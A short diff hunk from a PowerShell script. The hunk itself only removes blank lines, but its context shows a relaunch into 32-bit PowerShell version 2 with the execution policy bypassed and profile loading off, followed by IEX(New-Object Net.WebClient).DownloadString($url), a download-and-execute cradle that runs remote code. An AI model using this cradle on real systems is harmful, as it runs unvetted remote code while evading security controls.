@@ -18,9 +18,6 @@ write-warning "This is 64x, switching to 32x and continuing script."
 Write-host "Executing script from $url" -foregroundcolor "green" 
 
 & "C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -version 2 -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString($url)
-
-
-
 exit 
 
 } 
